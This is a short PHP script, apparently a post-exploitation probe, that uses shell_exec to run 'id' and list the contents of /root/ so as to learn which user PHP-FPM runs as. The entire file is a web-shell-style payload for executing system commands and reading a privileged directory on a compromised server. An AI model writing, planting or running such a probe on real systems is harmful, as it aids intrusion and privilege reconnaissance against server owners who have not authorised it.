<?php
echo "=== WHOAMI VIA PHP-FPM ===\n";
echo "id: " . shell_exec('id');
echo "\n=== ROOT HOME ===\n";
echo shell_exec('ls -la /root/');
